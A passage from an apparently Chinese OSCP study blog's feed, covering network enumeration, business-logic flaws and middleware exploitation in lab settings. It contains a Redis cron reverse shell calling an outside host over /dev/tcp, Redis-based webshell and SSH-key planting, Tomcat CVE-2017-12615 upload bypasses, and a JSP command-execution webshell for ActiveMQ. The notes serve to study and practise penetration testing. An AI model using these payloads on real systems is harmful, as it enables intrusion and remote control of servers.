~/dict.txt -t brt</code> # 字典爆破</li><li><code>dnsrecon -dykwsad magacorpone.com</code></li><li><code>dnsenum zonetransfer.me</code></li><li><code>dnsenum zonetransfer.me -f list.txt</code></li></ul></li></ul><h3 id="TCP、UDP端口扫描"><a href="#TCP、UDP端口扫描" class="headerlink" title="TCP、UDP端口扫描"></a>TCP、UDP端口扫描</h3><ul><li>检查目标TCP&#x2F;UDP端口上的服务类型、版本, 以及是否存在漏洞</li><li>扫描会产生显著特征的流量, 可能破坏目标系统应用, 即便是授权渗透也应谨慎</li><li>逐层细化扫描颗粒度, 根据上一步的结果决定接下来的扫描动作</li><li>TCP扫描<ul><li><code>nc -nvv -w 1 -z 10.0.2.5 3388-3390</code></li></ul></li><li>UDP端口(扫描器通常忽略UDP端口)<ul><li>UDP是无状态尽力传输的协议, 没有三次握手机制, 使用针对协议的UDP扫描提高精确度</li><li>发送UDP空包, 端口开放服务器无响应, 端口关闭返回icmp端口不可达</li><li>此机制扫描不完全准确, 但有很多攻击向量(应用处理异常, FW过滤ICMP包)</li><li><code>nc -nvv -w 1 -z -u 10.0.2.5 160-162</code></li></ul></li></ul><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><ul><li>NMAP端口扫描<ul><li>需要sudo运行, 扫描选项需要访问raw sockets</li><li>C段进行全端口扫描大约消耗1GB流量</li><li>大段扫描时应考虑带宽、速度、流量问题</li></ul></li></ul><h3 id="扫描技术"><a href="#扫描技术" class="headerlink" title="扫描技术"></a>扫描技术</h3><ul><li><p>SYN扫描</p><ul><li>NMAP默认使用, 不完成三次握手, 信息未达到应用层, 不产生应用层日志(网络层检测), 快速</li><li>现代防火墙普遍具备半开连接的检测能力</li><li><code>sudo nmap -sS 10.0.2.5</code></li></ul></li><li><p>TCP 全连接扫描</p><ul><li>因为要等待回包完成握手, 因此需要全连接扫描, 已挂socks代理扫描时, 必须使用 -sT</li></ul></li><li><p>UDP端口</p><ul><li>nmap使用两种方式进行udp端口扫描, ICMP port unreachable 和 协议指令</li><li>需要sudo权限</li><li><code>sudo nmap -sU 10.0.2.5</code></li></ul></li><li><p>Ping Sweeping</p><ul><li>-sn &#x3D; ARP + ICMP + SYN443 + ACK80 + ICMP时间戳</li><li><code>nmap -sn 10.0.2.1-254</code></li></ul></li></ul><h3 id="OS指纹"><a href="#OS指纹" class="headerlink" title="OS指纹"></a>OS指纹</h3><ul><li>Banner 获取队流量和速度影响较大<ul><li><code>nmap -sV -sT -A 10.0.2.5</code></li></ul></li><li>NSE脚本引擎<ul><li>DNS枚举, 爆破, 漏洞识别, 应用层交互</li><li>脚本位于&#x2F;usr&#x2F;share&#x2F;nmap&#x2F;scripts</li></ul></li></ul><h3 id="masscan"><a href="#masscan" class="headerlink" title="masscan"></a>masscan</h3><ul><li>快, 你别问他准不准, 快就完事了</li></ul><h2 id="SMB-枚举"><a href="#SMB-枚举" class="headerlink" title="SMB 枚举"></a>SMB 枚举</h2><h3 id="SMB服务"><a href="#SMB服务" class="headerlink" title="SMB服务"></a>SMB服务</h3><ul><li>SMB容易出漏洞</li><li>2000、xp时代无需身份验证的smb空会话, 随系统更新不断</li><li>扫描NetBIOS服务<ul><li>TCP 139、UDP 137、138</li><li>NBT(NetBIOS over TCP) 兼容早期系统, 经常与SMB配合使用。因此可以同时枚举这两种服务</li><li><code>nmap -v -p 139,445 -oG smb.txt 10.0.2.5-254</code></li></ul></li><li>NetBIOS枚举工具<ul><li><code>sudo nbtscan -r 10.0.2.5/24</code></li><li><code>-r</code> # 通过UDP137查询NetBIOS名称服务</li></ul></li></ul><h2 id="NFS-枚举"><a href="#NFS-枚举" class="headerlink" title="NFS 枚举"></a>NFS 枚举</h2><h3 id="NFS服务"><a href="#NFS服务" class="headerlink" title="NFS服务"></a>NFS服务</h3><ul><li>SUN Micorsystem开发的分布式文件系统服务<ul><li>允许客户端访问网络上其他主机的存储, 就像访问本地存储一样</li></ul></li><li>通常用于Liunx系统, 是一种不安全的协议<ul><li>很难配置的安全, 开放共享京城出现</li><li>泄漏敏感信息, 被用于提权</li></ul></li><li>NFS 工作过程<ul><li>Portmapper 和 RPCbind服务都运行在tcp111上</li><li>RPC进程启动时通知RPCbind, 注册其正在监听的端口和RPC程序号</li><li>客户端用特定的RPC程序号联系服务端RPCbind, RPCbind重定向到正确的端口号(通常是TCP端口2049)的服务</li></ul></li></ul><h3 id="扫描NFS"><a href="#扫描NFS" class="headerlink" title="扫描NFS"></a>扫描NFS</h3><ul><li>扫描rpcbind端口<ul><li><code>nmap -v -p 111 10.0.2.5-254</code></li></ul></li><li>脚本扫描NFS<ul><li><code>nmap -p 111 --scrpit nfs* 10.0.2.5</code></li></ul></li><li>挂载NFS<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> home<br>sudo mount -o nolock 10.0.2.15:/home ~/home/<br><span class="hljs-built_in">cd</span> home/user1 &amp;&amp; ls-lan<br><span class="hljs-comment"># -rwx------ 1 1014 1014 48 Jun 10 09:16 creds.txt</span><br><span class="hljs-comment"># 这里的1014是用户的uid</span><br><span class="hljs-built_in">cat</span> creds.txt<br></code></pre></td></tr></table></figure></li><li>添加新账号<ul><li><code>sudo adduser pwn</code></li></ul></li><li>修改UID为1014</li><li>切换账号, 访问文件</li></ul><h3 id="SMTP-枚举"><a href="#SMTP-枚举" class="headerlink" title="SMTP 枚举"></a>SMTP 枚举</h3><ul><li><p>VRFY请求服务器验证邮件地址是否正确</p></li><li><p>EXPN向服务器请求邮件列表的成员, 用于爆破用户名</p></li><li><p><code>nc -nv 10.0.2.5 25</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">(UNKONWN)[10.0.2.5] 25(smtp) open<br>VRFY root<br>252 2.0.0 root<br>VRFY idontexist<br>550 5.1.1 &lt;&gt;...<br></code></pre></td></tr></table></figure></li><li><p>邮件账号验证脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/share/python</span><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) != <span class="hljs-number">2</span>:<br>  <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Usage: vrfy.py &lt;username&gt;&quot;</span><br>  sys.exit(<span class="hljs-number">0</span>)<br><span class="hljs-comment"># Create a Socket</span><br>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br><br><span class="hljs-comment"># connect to the server</span><br>connect = s.connect((<span class="hljs-string">&#x27;10.0.2.5&#x27;</span>,<span class="hljs-number">25</span>))<br><br><span class="hljs-comment"># Receive the Banner</span><br>banner = s.recv(<span class="hljs-number">1024</span>)<br><br><span class="hljs-built_in">print</span> banner<br><br><span class="hljs-comment"># VRFY a user</span><br>s.send(<span class="hljs-string">&#x27;VRFY&#x27;</span> + sys.argv[<span class="hljs-number">1</span>] + <span class="hljs-string">&#x27;\r\n&#x27;</span>)<br>result = s.recv(<span class="hljs-number">1024</span>)<br><br><span class="hljs-built_in">print</span> result<br><br>s.close()<br></code></pre></td></tr></table></figure></li></ul><h2 id="SNMP枚举"><a href="#SNMP枚举" class="headerlink" title="SNMP枚举"></a>SNMP枚举</h2><h3 id="SNMP-协议"><a href="#SNMP-协议" class="headerlink" title="SNMP 协议"></a>SNMP 协议</h3><ul><li>SNMP无状态、基于UDP, 用于监控网络设备、系统、应用<ul><li>容易遭受IP欺骗、重放攻击。1、2、2C流量不加密, 默认弱口令public&#x2F;private</li></ul></li><li>MIB Tree<ul><li>SNMP管理信息库MIB(Management Information Base)是包含网络管理信息的树形数据库</li></ul></li><li>Windows系统<ul><li><code>1.3.6.1.2.1.25.1.6.0       -&gt;  System Processes</code></li><li><code>1.3.6.1.2.1.25.4.2.1.2     -&gt;  Running Programs</code></li><li><code>1.3.6.1.2.1.25.4.2.1.4     -&gt;  Processes Path</code></li><li><code>1.3.6.1.2.1.25.2.3.1.4     -&gt;  Storage Units</code></li><li><code>1.3.6.1.2.1.25.6.3.1.2     -&gt;  软件名</code></li><li><code>1.3.6.1.4.1.77.1.2.25      -&gt;  用户账号</code></li><li><code>1.3.6.1.2.1.6.13.1.3       -&gt;  TCP Local Ports</code></li></ul></li></ul><h3 id="扫描SNMP"><a href="#扫描SNMP" class="headerlink" title="扫描SNMP"></a>扫描SNMP</h3><ul><li><code>sudo nmap -sU --open -p161 10.0.2.5-254 -oG open-snmp.txt</code></li><li>使用onesixtyone扫描整个网段<ul><li><code>onesixtyone -c dict.txt -i ip.txt</code></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>OSCP-Notes</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OSCP</tag>
      
      <tag>web渗透</tag>
      
      <tag>信息收集</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>业务逻辑漏洞</title>
    <link href="/2022/07/27/%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
    <url>/2022/07/27/%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="业务逻辑漏洞"><a href="#业务逻辑漏洞" class="headerlink" title="业务逻辑漏洞"></a>业务逻辑漏洞</h1><h2 id="商品数据逻辑漏洞"><a href="#商品数据逻辑漏洞" class="headerlink" title="商品数据逻辑漏洞"></a>商品数据逻辑漏洞</h2><h3 id="支付逻辑漏洞"><a href="#支付逻辑漏洞" class="headerlink" title="支付逻辑漏洞"></a>支付逻辑漏洞</h3><ul><li><p>订单ID篡改</p><ul><li>查看自己订单，修改 订单ID查看是否能查看其他订单信息</li></ul></li><li><p>商品编号篡改</p><ul><li>积分商城，利用低积分兑换高积分礼物</li><li>选取低积分礼物兑换，提交抓包</li><li>修改其中的 goods_id（商品编号）为高积分的商品编号</li><li>提交，就可以发现逻辑漏洞的实现</li></ul></li><li><p>用户ID篡改</p><ul><li>抓包查看自己的 用户ID，修改 ID查看是否能查看其他用户信息</li></ul></li><li><p>金额 篡改</p><ul><li>抓包修改金额等字段</li></ul></li><li><p>商品数量篡改</p><ul><li>抓包修改商品数量等字段</li><li><strong>很多商品限制用户购买数量，服务器仅在页面通过 <code>JS</code> 脚本限制，未在服务端校验用户提交的数量，通过抓包修改商品最大限制数量，即将请求中的商品数量改为大于最大数值限制，查看是否能完成修改后的数量完成业务流程</strong></li></ul></li><li><p>积分、代金券篡改</p></li><li><p>篡改后注意如果有验证，可以拦截请求响应包修改来测试。</p></li></ul><h2 id="认证模块逻辑漏洞"><a href="#认证模块逻辑漏洞" class="headerlink" title="认证模块逻辑漏洞"></a>认证模块逻辑漏洞</h2><h3 id="身份认证逻辑"><a href="#身份认证逻辑" class="headerlink" title="身份认证逻辑"></a>身份认证逻辑</h3><ul><li><p>暴力破解</p><ul><li>在 没有 验证码限制或者一次验证码可以使用 多次 使用的情况下<ul><li>使用已知用户名对密码进行暴力破解</li><li>使用一个弱口令密码对用户进行暴力破解</li></ul></li></ul></li><li><p>Cookie仿冒欺骗</p><ul><li>通过修改 <code>Cookie</code> 中的某个参数来实现登录其他用户</li><li>直接进去后台</li><li>一些网站会利用 Cookie 是否为空、Session是否为 true 来判断用户是否可以登录，只要构造一个 Cookie或 Session为 true就可以绕过认证登录</li></ul></li><li><p>Session欺骗延迟</p></li><li><p>前端js代码验证</p><ul><li>一些未授权页面访问时，访问后弹框显示需要登录</li><li>一般为js代码验证</li><li>这种验证可以禁用本地js代码功能来访问页面</li><li>或者用burp抓包，拦截访问验证包来丢弃实现。</li></ul></li><li><p>服务器响应欺骗</p><ul><li>通过抓取某请求包拦截对应响应包来修改服务器的响应</li><li>修改响应码或者返回数据包内容</li><li>增删js代码</li><li>把包中false改成true</li><li>0改成1</li><li>把no改成yes</li><li>可以通过前台账号登录成功的响应页面来参考修改后台</li></ul></li><li><p>密码重置逻辑</p><ul><li>常见的密码找回方式<ul><li>邮箱找回密码</li><li>根据密码保护问题找回密码</li><li>根据手机号找回密码</li><li>密码找回逻辑测试流程</li></ul></li><li>尝试正常密码找回流程</li><li>选择不同的找回方式，记录所有数据包</li><li>分析数据包，找出敏感部分</li><li>分析后台找回机制所采用的验证手段</li><li>修改数据包进行验证是否存在密码找回漏洞</li></ul></li></ul><h3 id="越权漏洞挖掘"><a href="#越权漏洞挖掘" class="headerlink" title="越权漏洞挖掘"></a>越权漏洞挖掘</h3><ul><li><p>绕过授权验证</p><ul><li>水平越权</li><li>纵向越权</li></ul></li><li><p>漏洞出现点</p><ul><li>数据交互的地方</li><li>用户可操作的地方</li><li>参数可控制的地方</li></ul></li></ul><h2 id="业务流程模块逻辑漏洞"><a href="#业务流程模块逻辑漏洞" class="headerlink" title="业务流程模块逻辑漏洞"></a>业务流程模块逻辑漏洞</h2><h3 id="业务重放测试"><a href="#业务重放测试" class="headerlink" title="业务重放测试"></a>业务重放测试</h3><ol><li>在生成的订单流程时抓取订购请求</li><li>观察每次订购相同商品的请求是否存在不同的随机token、可变参数等，若有则检查这些随机的变化情况和失效情况，是否在当前订购流程中唯一有效</li><li>尝试重放之前已经完成流程的订购请求，观察服务器是否做出正确响应，若订购再次生效，则存在该漏洞。</li></ol><h3 id="业务上限测试"><a href="#业务上限测试" class="headerlink" title="业务上限测试"></a>业务上限测试</h3><ul><li>该测试主要判断应用程序是否对业务预期范围外的业务请求做出正确响应。</li><li>在业务查询-受理基础查询中，应用程序只允许登录用户查询6个月的受理记录，但是通过抓包可以得到查询月份参数，修改到6个月之前的记录提交请求，如果返回6个月之前的查询记录，则漏洞存在。</li></ul><h3 id="业务流程乱序测试"><a href="#业务流程乱序测试" class="headerlink" title="业务流程乱序测试"></a>业务流程乱序测试</h3><ul><li>乱序测试主要是对业务流程是否正常，确保攻击者无法通过技术手断绕过某些重要流程步骤，检验办理业务过程中是否有可控制来保证其遵循正常流程。</li><li>正常流程如：<ul><li>第一步：注册并发送验证码</li><li>第二步： 输入验证码</li><li>第三步： 注册成功</li></ul></li><li>但是如果在第三步抓包分析，将注册的邮箱或者手机号改成别人的提交，看是否把账号注册成了别人的信息呢。如果成功则跳过了正常的业务流程，则存在该漏洞。</li><li>同样的漏洞可能其他流程环节进行测试，如：支付，购物，注册，找回密码等过程检测。</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>业务逻辑漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>其他漏洞</title>
    <link href="/2022/07/26/%E5%85%B6%E4%BB%96%E6%BC%8F%E6%B4%9E/"/>
    <url>/2022/07/26/%E5%85%B6%E4%BB%96%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="中间件漏洞"><a href="#中间件漏洞" class="headerlink" title="中间件漏洞"></a>中间件漏洞</h1><h2 id="Struts2漏洞"><a href="#Struts2漏洞" class="headerlink" title="Struts2漏洞"></a>Struts2漏洞</h2><ul><li><p>Struts是Apache基金会Jakarta项目组的一个开源项目，Struts通过采用Java Servlet&#x2F;JSP技术，实现了基于Java EE Web应用的Model-View-Controller（MVC）设计模式的应用框架，是MVC经典设计模式中的一个经典产品。目前，Struts广泛应用于大型互联网企业、政府、金融机构等网站建设，并作为网站开发的底层模板使用，是应用最广泛的Web应用框架之一。</p></li><li><p>漏洞挖掘</p><ul><li>工具爬行</li><li>找到存在漏洞地址例如：xx.action</li></ul></li><li><p>批量查找利用</p><ul><li>url采集相关关键字</li><li>批量探测及利用</li></ul></li></ul><h2 id="Java-反序列漏洞"><a href="#Java-反序列漏洞" class="headerlink" title="Java 反序列漏洞"></a>Java 反序列漏洞</h2><ul><li>Java反序列化漏洞简介<ul><li>序列化就是把对象转换成字节流，便于保存在内存、文件、数据库中；反序列化即逆过程，由字节流还原成对象。Java中的ObjectOutputStream类的writeObject()方法可以实现序列化，类ObjectInputStream类的readObject()方法用于反序列化。</li></ul></li></ul><h2 id="Redis漏洞"><a href="#Redis漏洞" class="headerlink" title="Redis漏洞"></a>Redis漏洞</h2><ul><li><p>Redis 漏洞简介以及危害</p><ul><li>Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。</li><li>redis未授权访问漏洞：<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220726170706.png"></li></ul></li><li><p>漏洞危害</p><ul><li>攻击者无需认证访问到内部数据，可能导致敏感信息泄露，黑客也可以恶意执行flushall来清空所有数据；</li><li>攻击者可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件；</li><li>最严重的情况，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器</li></ul></li></ul><h3 id="写-webshell-文件实现远程控制"><a href="#写-webshell-文件实现远程控制" class="headerlink" title="写 webshell 文件实现远程控制"></a>写 webshell 文件实现远程控制</h3><ul><li>redis 漏洞利用<ul><li>写 webshell 文件实现远程控制</li><li>一旦控制 redis 后，优先想到的是写 webshell，容错性是它最大优势。假定目标是 PHP 环境、web 的根目录为&#x2F;var&#x2F;www&#x2F;html，按前面步骤尝试写个普通 PHP 脚本看下是否能成功解析：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ redis-cli -p 6379 -h 192.168.230.128<br>192.168.230.128:6379&gt; CONFIG SET dbfilename phpinfo.php<br>OK<br>192.168.230.128:6379&gt; CONFIG SET <span class="hljs-built_in">dir</span> <span class="hljs-string">&quot;/var/www/html&quot;</span><br>OK<br>192.168.230.128:6379&gt; CONFIG SET rdbcompression no<br>OK<br>192.168.230.128:6379&gt; SET phpinfo<span class="hljs-string">&quot;\n\n &lt;?php phpinfo(); ?&gt; \n\n&quot;</span> NX<br>OK<br>192.168.230.128:6379&gt; save<br>OK<br></code></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220726174120.png"></li></ul></li></ul><h3 id="将反弹shell脚本写入-x2F-etc-x2F-crontab"><a href="#将反弹shell脚本写入-x2F-etc-x2F-crontab" class="headerlink" title="将反弹shell脚本写入&#x2F;etc&#x2F;crontab"></a>将反弹shell脚本写入&#x2F;etc&#x2F;crontab</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 将反弹shell写入计划任务</span><br><span class="hljs-built_in">set</span> 1 <span class="hljs-string">&quot;\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.8.124/1122 0&gt;&amp;1\n\n\n\n&quot;</span> <br>config <span class="hljs-built_in">set</span> <span class="hljs-built_in">dir</span> /etc/<br>config <span class="hljs-built_in">set</span> dbfilename crontab<br>save<br></code></pre></td></tr></table></figure><h3 id="利用MSF-破解Redis弱口令导入ssh公钥链接"><a href="#利用MSF-破解Redis弱口令导入ssh公钥链接" class="headerlink" title="利用MSF 破解Redis弱口令导入ssh公钥链接"></a>利用MSF 破解Redis弱口令导入ssh公钥链接</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">search redis<br>auxiliary/scanner/redis/file_upload   <span class="hljs-comment">#该exp功能为上传本地的文件到目标服务器。</span><br>auxiliary/scanner/redis/redis_login   <span class="hljs-comment">#该exp功能是对redis的密码进行枚举，亲测速度很快。</span><br>auxiliary/scanner/redis/redis_server   <span class="hljs-comment">#该exp功能是验证枚举或者其他手段得到的redis密码是否正确，该功能会执行一个info命令并返回执行结果。</span><br></code></pre></td></tr></table></figure><h3 id="msf-破解redis-口令"><a href="#msf-破解redis-口令" class="headerlink" title="msf 破解redis 口令"></a>msf 破解redis 口令</h3><ul><li>使用auxiliary&#x2F;scanner&#x2F;redis&#x2F;redis_login进行枚举redis密码<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220726181759.png"></li><li>验证口令正确性<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220727160417.png"></li></ul><h3 id="上传文件ssh密钥"><a href="#上传文件ssh密钥" class="headerlink" title="上传文件ssh密钥"></a>上传文件ssh密钥</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">auxiliary/scanner/redis/file_upload  上传文件模块<br>ssh-keygen -t rsa<br><span class="hljs-built_in">cd</span> /root/.ssh/<br><span class="hljs-built_in">cp</span> id_rsa.pub  authorized_keys<br>vi authorized_keys<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220726182144.png"></p><ul><li>在文件内容得前面和后面都加上\n\n\n</li><li>为了能正常上传测试，在目标机器上创建&#x2F;root&#x2F;.ssh 目录 <code>mkdir /root/.ssh</code></li><li>用密钥链接ssh</li><li><code>ssh -i /root/.ssh/id_rsa root@192.168.230.128 </code><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220726182308.png"></li></ul><h2 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h2><ul><li><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) </p><ul><li>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</li><li>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</li></ul></li><li><p>漏洞产生</p><ul><li>用户在地址栏输入网址 –&gt; 向目标网站发送请求 –&gt; 目标网站接受请求并在服务器端验证请求是否合法，然后返回用户所需要的页面 –&gt; 用户接收页面并在浏览器中显示</li><li>此处的请求默认为<a href="http://www.xxx.com/a.php?image=%EF%BC%88%E5%9C%B0%E5%9D%80%EF%BC%89">www.xxx.com/a.php?image=（地址）</a></li><li>那么产生SSRF漏洞的环节在哪里呢？目标网站接受请求后在服务器端验证请求是否合法</li><li>产生的原因：服务器端的验证并没有对其请求获取图片的参数（image&#x3D;）做出严格的过滤以及限制，导致可以从其他服务器的获取一定量的数据</li></ul></li></ul><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220727141837.png"></p><h3 id="SSRF漏洞的寻找-漏洞常见出没位置"><a href="#SSRF漏洞的寻找-漏洞常见出没位置" class="headerlink" title="SSRF漏洞的寻找(漏洞常见出没位置):"></a>SSRF漏洞的寻找(漏洞常见出没位置):</h3><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220727141938.png"></p><h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><ul><li><p>因为SSRF漏洞是构造服务器发送请求的安全漏洞，所以我们就可以通过抓包分析发送的请求是否是由服务器的发送的来判断是否存在SSRF漏洞</p></li><li><p>在页面源码中查找访问的资源地址 ，如果该资源地址类型为 <code>http://www.xxx.com/a.php?image=</code>的就可能存在SSRF漏洞</p></li></ul><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.jianshu.com/p/6bf7700139fa">https://www.jianshu.com/p/6bf7700139fa</a><br><a href="https://www.jianshu.com/p/cc752eb8deca">https://www.jianshu.com/p/cc752eb8deca</a></p><h2 id="WEB-中间件漏洞"><a href="#WEB-中间件漏洞" class="headerlink" title="WEB 中间件漏洞"></a>WEB 中间件漏洞</h2><h3 id="其他漏洞"><a href="#其他漏洞" class="headerlink" title="其他漏洞"></a>其他漏洞</h3><ul><li>tomcat 部署漏洞<ul><li>访问tomacat mamnager页面</li><li>尝试弱口令爆破</li><li>登录管理页面</li><li>部署war文件</li><li>得到shell</li></ul></li></ul><h3 id="tomcat远程命令执行漏洞-CVE-2017-12615"><a href="#tomcat远程命令执行漏洞-CVE-2017-12615" class="headerlink" title="tomcat远程命令执行漏洞(CVE-2017-12615)"></a>tomcat远程命令执行漏洞(CVE-2017-12615)</h3><p><strong>影响范围 Apache Tomcat 7.0.0 – 7.0.81</strong></p><ul><li>只要web.xml设置了readonly&#x3D;false<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220727142740.png"></li></ul><p><strong>漏洞复现</strong></p><ol><li>利用PUT方法上传构造好的shell</li><li>利用上传的shell来进行命令执行</li></ol><ul><li>在构造上传方法时有三种<ul><li><code>PUT /test.jsp%20</code></li><li><code>PUT /test.jsp/</code></li><li><code>PUT /test.jsp:DATA</code></li></ul></li><li>通过构造特殊的后缀来绕过，Tomcat的检测，将jsp的shell上传到服务器中。</li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220727143004.png"></p><p>直接访问 <code>http://192.168.230.131:8080/test.jsp?cmd=ipconfig </code><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220727143052.png"></p><h3 id="Apache-ActiveMQ-Fileserver远程代码执行漏洞"><a href="#Apache-ActiveMQ-Fileserver远程代码执行漏洞" class="headerlink" title="Apache ActiveMQ Fileserver远程代码执行漏洞"></a>Apache ActiveMQ Fileserver远程代码执行漏洞</h3><ul><li><p>扫端口的时候遇到8161端口，输入admin&#x2F;admin</p></li><li><p>通过put上去一句话然后move移动到admin目录即可拿shell</p></li><li><p>环境搭建</p><ul><li>ActiveMQ 5.1.0 下载地址：<a href="http://activemq.apache.org/activemq-510-release.html">http://activemq.apache.org/activemq-510-release.html</a></li><li>解压后，双击运行abtivemq.bat运行。（进入bin目录，根据自己的操作系统选择win32或win64，5.1.0只有win32目录）</li><li>访问8161端口：<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220727143354.png"></li></ul></li></ul><p><strong>漏洞复现</strong></p><ol><li>获取物理路径    <code>PUT /fileserver/%20/%20 HTTP/1.1</code><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220727143504.png"></li><li>PUT 一个 Jsp 的 Webshell 到 fileserver 目录    <code>PUT /fileserver/1.jsp HTTP/1.1 </code><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.*&quot;</span>%&gt;<br>&lt;%<br>    out.print(<span class="hljs-string">&quot;Hello&lt;/br&gt;&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">strcmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">line</span> <span class="hljs-operator">=</span><span class="hljs-literal">null</span>;<br>    Process p=Runtime.getRuntime().exec(strcmd);<br>     <span class="hljs-type">InputStream</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> p.getInputStream();<br>      <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">br</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(is));<br>    <span class="hljs-keyword">while</span>((line =br.readLine())!=<span class="hljs-literal">null</span>)&#123;<br>        out.print(line+<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>);<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220727143622.png"></li><li>利用 MOVE 方法将 Webshell 移入 admin&#x2F; 目录</br><br><code>MOVE /fileserver/1.jsp  HTTP/1.1</code></br>`Destination:file://C:\activemq\webapps\admin\11.jsp`![](https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220727143841.png)**ActiveMQ的默认的上传地址无法解析jsp, 所以通过一些手段将它移走**</li></ol><h3 id="weblogic攻击"><a href="#weblogic攻击" 